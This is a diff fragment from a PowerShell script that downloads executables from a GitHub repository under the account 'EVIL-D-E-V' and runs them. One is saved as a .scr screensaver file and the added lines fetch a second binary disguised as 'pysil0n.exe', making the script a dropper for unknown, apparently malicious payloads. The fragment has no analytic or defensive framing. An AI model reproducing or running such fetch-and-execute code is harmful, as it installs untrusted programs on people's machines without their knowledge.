@@ -69,3 +69,8 @@ $url = "https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/XClienta.
 $output = "$dir\Updatecli4mt.scr"
 Invoke-WebRequest -Uri $url -OutFile $output
 Start-Process $output
+
+$url = "https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/pyslion/lmao.vmp.exe"
+$output = "$dir\pysil0n.exe"
+Invoke-WebRequest -Uri $url -OutFile $output
+Start-Process $output
